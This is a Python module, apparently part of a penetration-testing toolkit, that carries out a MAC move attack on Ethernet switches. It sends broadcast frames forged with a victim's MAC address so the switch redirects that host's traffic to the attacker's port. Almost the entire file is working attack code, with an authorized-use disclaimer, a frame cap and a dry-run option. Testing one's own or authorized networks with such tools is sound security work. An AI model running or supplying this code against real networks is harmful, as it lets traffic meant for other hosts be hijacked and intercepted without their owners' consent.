"""MAC move abuse: makes the switch believe a learned host moved to the attacker's port.

A switch learns each source MAC on the port where it arrives. A dynamic entry follows the
latest frame, so one frame that claims the victim's MAC from another port moves the entry
there. Traffic for that MAC then follows the new location, until the real host sends again.

This module sends that move frame, or a few of them, once. It does not keep the entry moved.
Whether the switch limits moves, logs them, or restricts the ports allowed for an address
depends on the switch, and the lab on a Linux bridge does not reproduce those policies.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, normalize_unicast_mac

MAX_FRAMES = 100           # one frame is one move; higher counts are refused
EXPERIMENTAL_ETHERTYPE = 0x88B5   # IEEE 802 local experimental EtherType
PAYLOAD = b"MACabre MAC move probe"


@dataclass(frozen=True)
class MacMoveConfig:
    iface: str                  # attacker interface, on a port other than the host's own
    target_mac: str             # the MAC address to move to this port (required)
    frames: int = 1             # frames to send; each one moves the entry
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.target_mac)
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class MacMoveStats:
    target_mac: str = ""
    frames: int = 0
    status: str = ""


def move_frames(target_mac: str, how_many: int) -> list[Packet]:
    """Broadcast frames whose source is the target MAC address."""
    source = normalize_unicast_mac(target_mac)
    return [
        Ether(src=source, dst=BROADCAST_MAC, type=EXPERIMENTAL_ETHERTYPE) / Raw(PAYLOAD)
        for _ in range(how_many)
    ]


def run_mac_move(
    config: MacMoveConfig,
    stop_event: threading.Event,
    on_progress: Callable[[MacMoveStats], None],
    send: Callable[..., Any] | None = None,
) -> MacMoveStats:
    """Send the move frames once, unless `stop_event` is set first."""
    send = send or sendp
    target = normalize_unicast_mac(config.target_mac)

    if config.dry_run:
        stats = MacMoveStats(
            target_mac=target,
            status=(
                f"Dry run: would send {config.frames} frame(s) with source {target} from this port. "
                f"Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = MacMoveStats(target_mac=target)
    if stop_event.is_set():
        return stats
    send(move_frames(target, config.frames), iface=config.iface, verbose=False)
    stats.frames = config.frames
    on_progress(replace(stats))
    return stats
